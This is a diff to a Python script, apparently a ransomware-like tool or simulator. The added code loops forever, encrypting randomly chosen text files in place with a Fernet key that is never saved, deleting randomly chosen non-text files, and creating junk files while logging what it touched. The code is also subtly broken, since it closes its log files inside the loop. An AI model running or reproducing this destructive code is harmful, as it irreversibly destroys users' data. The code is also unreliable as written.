@@ -2,6 +2,7 @@ import os
 import random
 import pathlib
 import time
+from cryptography.fernet import Fernet
 import colorama
 from colorama import Fore, Back, Style
 colorama.init()
@@ -48,15 +49,37 @@ print(Fore.RED+ "these are to Non-TEXT modifiable files: ")
 print(NonText_Files_Table)
 print(Fore.GREEN + "one of the root files " + str(theroot))
 
+f1 = open("encryptedfiles.txt","a")
+f2 = open("deletedfiles.txt","a")
+key = Fernet.generate_key()
 
 while True:
 	randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
 	randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
 	randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
 
+	##################################### encrypting a file: ########################################
+	f1.write(str(Text_Files_Table[randomeNumberOfTextFiles]) + "\n")
 	print("encrypt: " + str(Text_Files_Table[randomeNumberOfTextFiles]))
+	with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
+		contents = thefile.read()
+	contents_enctypted = Fernet(key).encrypt(contents)
+	with open(Text_Files_Table[randomeNumberOfTextFiles],"wb") as thefile:
+		thefile.write(contents_enctypted)
+	f1.close()
+	Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
 	time.sleep(5)
+	
+	##################################### deleting a file: #####################################
+	f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
 	print("delete: " +  str(NonText_Files_Table[randomeNumberOfNonTextFiles]))
+	os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
+	f2.close()
+	NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
 	time.sleep(5)
+	
+	##################################### addind a file: #####################################
+	f = open(str(randomeNumberOfFiles), "w")
+	f.close()
 	print("add file: " +  str(randomeNumberOfFiles))
-   
+	time.sleep(5)
